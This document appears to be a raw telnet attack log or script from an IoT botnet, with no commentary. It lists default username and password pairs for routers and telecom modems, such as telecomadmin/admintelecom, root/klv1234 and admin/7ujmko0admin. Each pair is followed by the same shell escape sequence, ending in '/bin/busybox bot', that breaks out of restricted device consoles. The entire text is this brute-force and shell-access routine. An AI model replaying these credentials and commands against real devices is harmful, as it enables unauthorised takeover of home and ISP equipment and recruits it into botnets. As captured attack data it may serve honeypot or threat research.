telecomadmin

admintelecom
enable
system
linuxshell
start
shell
sh
/bin/busybox bot
e8telnet

e8telnet
enable
system
linuxshell
start
shell
sh
/bin/busybox bot
root


enable
system
linuxshell
start
shell
sh
/bin/busybox bot
admin

123
enable
system
linuxshell
start
shell
sh
/bin/busybox bot
root

root
enable
system
linuxshell
start
shell
sh
/bin/busybox bot
admin

519070
enable
system
linuxshell
start
shell
sh
/bin/busybox bot
root

7ujmko0admin
enable
system
linuxshell
start
shell
sh
/bin/busybox bot
admin

7ujmko0admin
enable
system
linuxshell
start
shell
sh
/bin/busybox bot
root

klv1234
enable
system
linuxshell
start
shell
sh
/bin/busybox bot
admin

1234
enable
system
linuxshell
start
shell
sh
/bin/busybox bot
e8telnet

e8telnet
enable
system
linuxshell
start
shell
sh
/bin/busybox bot
root

86981198
enable
system
linuxshell
start
shell
sh
/bin/busybox bot
user

user
enable
system
linuxshell
start
shell
sh
/bin/busybox bot
telecomadmin

admintelecom
enable
system
linuxshell
start
shell
sh
/bin/busybox bot
admin

7ujmko0admin
enable
system
linuxshell
start
shell
sh
/bin/busybox bot
